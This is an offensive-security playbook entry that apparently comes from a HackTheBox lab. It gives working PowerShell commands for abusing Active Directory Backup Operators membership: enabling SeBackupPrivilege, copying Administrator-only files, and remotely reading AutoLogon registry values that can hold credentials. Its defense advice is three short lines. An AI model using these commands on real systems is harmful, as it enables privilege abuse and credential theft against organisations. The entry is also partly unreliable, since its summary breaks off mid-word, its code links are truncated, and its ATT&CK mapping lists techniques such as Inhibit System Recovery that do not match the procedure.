---
id: ae75fbfc-ca21-443a-a6e6-003207ded8e7
name: Abusing Backup Operators Group for Sensitive File Access
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.546586+00:00'
updated_at: '2023-04-10T20:26:17.809931+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Impact|TA0040 - Impact]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Inhibit System Recovery|T1490 - Inhibit System Recovery]]'
tags:
- '[[Abusing Backup Operators Group]]'
- '[[Active Directory Attacks]]'
- '[[Active Directory Groups]]'
commands:
- '[[Check SeBackupPrivilege Status]]'
- '[[Copy flag.txt to Public folder]]'
- '[[Enable SeBackupPrivilege]]'
- '[[Read remote registry key]]'
---

# Abusing Backup Operators Group for Sensitive File Access

## Summary

Abusing the Backup Operators group is a common technique used by attackers to gain access to sensitive files on a target system. By adding a user account to the Backup Operators group, the user gains the ability to read any file on the system, regardless of the file's permissions. This technique ca

## Description

# Description

Abusing the Backup Operators group is a common technique used by attackers to gain access to sensitive files on a target system. By adding a user account to the Backup Operators group, the user gains the ability to read any file on the system, regardless of the file's permissions. This technique can be used to steal sensitive data, such as passwords or financial information, and can also be used to escalate privileges on the system. This procedure involves retrieving group members recursively, enabling backup privileges, copying sensitive files, and retrieving Autologon configuration.

## Requirements

1. Access to a user account with the ability to add users to the Backup Operators group

## Defense

1. Limit the number of users who have the ability to add users to the Backup Operators group

1. Monitor the Backup Operators group for changes

1. Implement file system permissions to limit access to sensitive files

## Objectives

1. Gain access to sensitive files on the target system

1. Escalate privileges on the target system

# Instructions

1. Use this command to retrieve all members of a specified group, including nested groups.

**Code**: [[PowerView> Get-NetGroupMember -Identity "Backup Op]]

> -Identity: Specifies the name of the group to retrieve members from.
-Recurse: Retrieves members recursively, including nested groups.

This command can be useful for checking the membership of a group, especially if the group has nested groups as members.

2. To enable backup privileges, run the following commands:

**Code**: [[Import-Module .\SeBackupPrivilegeUtils.dll
Import-]]

> The `Set-SeBackupPrivilege` cmdlet sets the backup privilege for the current process. The `Get-SeBackupPrivilege` cmdlet retrieves the current backup privilege setting. These commands are necessary for performing certain system-level tasks, such as backing up and restoring files and directories. The `Import-Module` cmdlets import the necessary modules to enable the `Set-SeBackupPrivilege` and `Get-SeBackupPrivilege` cmdlets.

**Command** ([[Enable SeBackupPrivilege]]):

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
```

**Command** ([[Check SeBackupPrivilege Status]]):

```bash
Get-SeBackupPrivilege
```

3. This command is used to copy sensitive files from a source location to a destination location. The '-Overwrite' argument will overwrite the destination file if it already exists.

**Code**: [[Copy-FileSeBackupPrivilege C:\Users\Administrator\]]

> The 'Copy-FileSeBackupPrivilege' command is used to copy files that require the SeBackupPrivilege permission. This permission is required to read files that are not accessible by normal users. In this example, the command is used to copy the 'flag.txt' file from the Administrator's user folder to the Public folder. This file may contain sensitive information that is not accessible by normal users.

**Command** ([[Copy flag.txt to Public folder]]):

```bash
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```

4. Use this command to retrieve the AutoLogon configuration from the HKLM\SOFTWARE hive.

**Code**: [[$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBa]]

> This command opens the remote base key 'LocalMachine' on the 'dc.htb.local' machine and navigates to the 'SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' subkey. It then retrieves the value names and their corresponding values for the AutoLogon configuration. This can be useful for checking if there is an AutoLogon configured on the remote machine, which could be a security risk.

**Command** ([[Read remote registry key]]):

```bash
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Impact|TA0040 - Impact]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Inhibit System Recovery|T1490 - Inhibit System Recovery]]

## Commands Used

- [[Check SeBackupPrivilege Status]]
- [[Copy flag.txt to Public folder]]
- [[Enable SeBackupPrivilege]]
- [[Read remote registry key]]

## Tags

- [[Abusing Backup Operators Group]]
- [[Active Directory Attacks]]
- [[Active Directory Groups]]
